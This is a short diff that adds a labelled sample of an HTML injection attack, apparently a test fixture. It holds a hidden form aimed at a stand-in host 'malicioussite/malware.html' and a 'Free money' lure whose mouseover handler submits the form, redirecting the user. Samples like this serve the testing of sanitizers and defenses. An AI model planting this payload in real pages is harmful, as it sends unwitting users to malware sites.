@@ -1,0 +1,5 @@
+## This file is an injection attack to redirect a user to a malicious site
+
+<form id="f" action="http://malicioussite/malware.html" method="get">
+</form>
+<i onmouseover="window.document.getElementById(\'f\').submit()">Free money 💰!! $$$
